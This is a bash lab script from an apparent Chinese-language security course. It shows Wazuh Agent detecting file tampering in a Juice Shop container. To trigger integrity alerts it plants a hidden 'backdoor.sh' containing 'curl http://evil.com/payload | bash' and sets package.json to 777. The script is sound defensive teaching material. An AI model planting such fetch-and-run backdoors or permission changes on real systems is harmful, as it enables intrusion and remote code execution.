#!/usr/bin/env bash
# Lesson 04 Attack Script
# 目标：演示 Wazuh Agent (HIDS) 对主机层威胁的检测。

set -euo pipefail

echo "============================================"
echo "  Lesson 04: HIDS (Wazuh Agent) Demo"
echo "============================================"
echo ""

# 1. 确认容器正常运行
echo "[Step 1] 检查容器状态..."
WAZUH_RUNNING=$(docker compose ps --format "{{.Name}}\t{{.Status}}" 2>/dev/null | grep -c "^wazuh-agent" || echo "0")
if [ "$WAZUH_RUNNING" -gt 0 ]; then
  echo "  ✓ Wazuh Agent 正在运行"
else
  echo "  ✗ Wazuh Agent 未运行"
  echo "  请确保已运行: docker compose up -d"
  exit 1
fi
echo ""

# 2. 模拟文件篡改（在 Juice Shop 容器中创建可疑文件）
#    Wazuh Agent 通过只读挂载的 juice-shop-data 卷检测这些变化
echo "[Step 2] 模拟文件篡改攻击..."
echo "  创建可疑文件（模拟后门）..."
docker exec juice-shop mkdir -p /app/tmp/.hidden 2>/dev/null || true
docker exec juice-shop sh -c 'echo "#!/bin/bash" > /app/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec juice-shop sh -c 'echo "# Reverse shell simulation" >> /app/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec juice-shop sh -c 'echo "curl http://evil.com/payload | bash" >> /app/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec juice-shop chmod +x /app/tmp/.hidden/backdoor.sh 2>/dev/null || true
echo "  ✓ 可疑文件已创建: /app/tmp/.hidden/backdoor.sh (通过共享卷被 Wazuh Agent 监控)"
echo ""

# 3. 修改文件权限（触发 FIM 属性变化告警）
echo "[Step 3] 修改文件权限（触发属性变化告警）..."
docker exec juice-shop chmod 777 /app/package.json 2>/dev/null || true
echo "  ✓ 文件权限已修改: /app/package.json → 777"
echo ""

# 4. 等待 HIDS 检测
echo "[Step 4] 等待 Wazuh Agent 检测变化..."
sleep 15
echo "  ✓ 等待完成"
echo ""

# 5. 查看 Wazuh Agent 日志
echo "[Step 5] 查看 Wazuh Agent 日志..."
echo "  最近的检测日志:"
docker compose logs --tail=30 wazuh-agent 2>/dev/null | grep -i "syscheck\|fim\|added\|modified\|integrity" | tail -10 || echo "  (无 FIM 相关日志，Agent 可能仍在初始化)"
echo ""

# 6. 验证文件监控
echo "[Step 6] 验证文件完整性监控..."
echo "  Juice Shop 容器中的可疑文件:"
docker exec juice-shop ls -la /app/tmp/.hidden/ 2>/dev/null || echo "  (目录不存在)"
echo ""
echo "  Wazuh Agent 监控的目录:"
docker exec wazuh-agent ls -la /monitored/juice-shop/tmp/.hidden/ 2>/dev/null || echo "  (文件不可见 — 检查卷挂载)"


echo ""
echo "============================================"
echo "  结论"
echo "============================================"
echo "  Wazuh Agent 通过共享 Docker 卷 (juice-shop-data) 以只读方式"
echo "  监控 Juice Shop 容器的文件完整性，检测文件篡改和权限变化。"
echo "  HIDS 从主机内部视角发现威胁，是安全防御链的关键一环。"
echo "  下一课：添加 SIEM (Wazuh Manager) 聚合所有安全日志！"
echo "============================================"
